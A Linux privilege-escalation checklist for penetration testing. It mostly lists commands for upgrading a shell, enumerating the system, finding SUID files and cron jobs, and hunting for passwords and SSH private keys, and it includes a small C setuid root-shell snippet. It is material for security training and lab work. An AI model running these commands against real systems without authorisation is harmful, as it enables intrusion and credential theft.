A checklist for linux privesc. Might be missing lots of things. Is mostly taken from https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

Do you have a decent shell?
```
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")' 
echo os.system('/bin/bash') 
/bin/sh -i
```
To get tab completion working
```
ctrl+z
echo $TERM && tput lines && tput cols

stty raw -echo
fg

reset
export SHELL=bash 
export TERM=xterm-256color (screen when running tmux)
stty rows <num> columns <cols>
```
Or use Socat for a full reverse tty
```
socat file:`tty`,raw,echo=0 tcp-listen:12345
```


###  Initial Recon
Start by checking the version and distro of the machine for possible kernel exploits, and also the sudo permissions of whatever account you have if possible.
```
lsb_release -a && uname -a 
cat /etc/issue
cat /etc/*-release
cat /proc/version
sudo -l
```
To do things quick, run the LinEnum script from Rebootuser.

https://github.com/rebootuser/LinEnum

Check for plaintext passwords with it
```
./LinEnum.sh -t -k password
```
What users have shells on the box?
```
grep -vE "nologin|false" /etc/passwd
```
Anything in users home directories or mail?
```
ls -ahlR /root/
ls -ahlR /home/
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
```

Anything else in the environmental variables? symlinks?
```
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bash_logout
env
set
find / -type l -ls
```
Anything going on with the network? hidden services? logged in users?
```
/sbin/ifconfig -a 
cat /etc/network/interfaces 
cat /etc/sysconfig/network
lsof -i 
lsof -i :80 
grep 80 /etc/services 
netstat -antup 
netstat -antpx 
netstat -tulpn 
chkconfig --list 
chkconfig --list | grep 3:on 
last 
w
arp -a 
```

Can you sniff traffic?
```
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
```



### SUID Files, Root Services, and Other Files

Check for things running as root
```
ps aux | grep root
ps -ef | grep root
```
Check the version of something that's installed
```
dpkg -l | grep -i PAM
```
Any file-systems mounted or unmounted?
```
mount
df -h
cat /etc/fstab
```
Then do suid/guid and other interesting files.
```
find / -perm -4000 -exec ls -al -print 2>/dev/null {} \;
find / -uid 0 -perm -4000 2>/dev/null
```
To create our own SUID binary
```
print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid 
sudo chmod +s /tmp/suid 
```

SGID (chmod 2000) - run as the group, not the user who started it.
```
find / -perm -g=s -type f 2>/dev/null
```
SUID (chmod 4000) - run as the owner, not the user who started it.
```
find / -perm -u=s -type f 2>/dev/null
```
Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.

```
find / -perm -1000 -type d 2>/dev/null 
```

Are any folders or files world writeable and executable?
```
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print
```
Anything modified recently? To check for executables updated in August
```
find / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Aug
```
To find anything modified in the last 10 minutes
```
find / -mmin -10 -type f 2>/dev/null
```
Any writeable configuration files?
```
find /etc/ -writable -type f 2>/dev/null
```
Or any files containing 'config'
```
find . -iname '*config*'
```
To find a specific file
```
find /. -name suid\*
```
Files with passwords?
```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```
Find .conf files(recursive 4 levels) and output line number where the word 'password' is located
```
find / -maxdepth 7 -name *.conf -type f -exec grep -Hn password {} \; 2>/dev/null
```

Or other sensitive files
```
$ locate password | more           
/boot/grub/i386-pc/password.mod
/etc/pam.d/common-password
/etc/pam.d/gdm-password
/etc/pam.d/gdm-password.original
/lib/live/config/0031-root-password
```

Find all perl files ownd by rootme in /var/www
```
find /var/www -user rootme -name "*.pl"
```

Scan for string in all files in a directory
```
du . | awk '{print $2}'| grep -rnw "string" --color
```

Find password strings in memory 
```
strings /dev/mem -n10 | grep -i PASS
```

### Cron 
Look through these
```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```
This might not work but the for loop will list crontabs for a user.
```
for user in $(getent passwd|cut -f1 -d:); do echo "### Crontabs for $user ####"; crontab -u $user -l; done
```
This is a nice script from ihack4falafel to monitor cron and echo new processes

https://github.com/ihack4falafel/OSCP/blob/master/BASH/CronJobChecker.sh

### Keys and Database Passwords
Quick check for current user private keys 
```
ls	–al	~/.ssh/id_rsa	~/.ssh/id_dsa
```

Any private keys saved elsewhere?
```
cat ~/.ssh/authorized_keys 
cat ~/.ssh/identity.pub 
cat ~/.ssh/identity 
cat ~/.ssh/id_rsa.pub 
cat ~/.ssh/id_rsa 
cat ~/.ssh/id_dsa.pub 
cat ~/.ssh/id_dsa 
cat /etc/ssh/ssh_config 
cat /etc/ssh/sshd_config 
cat /etc/ssh/ssh\_host\_dsa_key.pub 
cat /etc/ssh/ssh\_host\_dsa_key 
cat /etc/ssh/ssh\_host\_rsa_key.pub 
cat /etc/ssh/ssh\_host\_rsa_key 
cat /etc/ssh/ssh\_host\_key.pub 
cat /etc/ssh/ssh\_host\_key
```
Whats in var?
```
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
```
Any files with database information?
```
ls -alhR /var/www/ 
ls -alhR /srv/www/htdocs/ 
ls -alhR /usr/local/www/apache22/data/ 
ls -alhR /opt/lampp/htdocs/ 
ls -alhR /var/www/html/
```
Default locations sometimes for good things
```
cat /var/apache2/config.inc 
cat /var/lib/mysql/mysql/user.MYD 
cat /root/anaconda-ks.cfg
```


### References

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/

https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA

https://bitvijays.github.io/LFC-VulnerableMachines.html#linux-privilege-escalation

https://github.com/lucyoa/kernel-exploits

https://github.com/SecWiki/linux-kernel-exploits



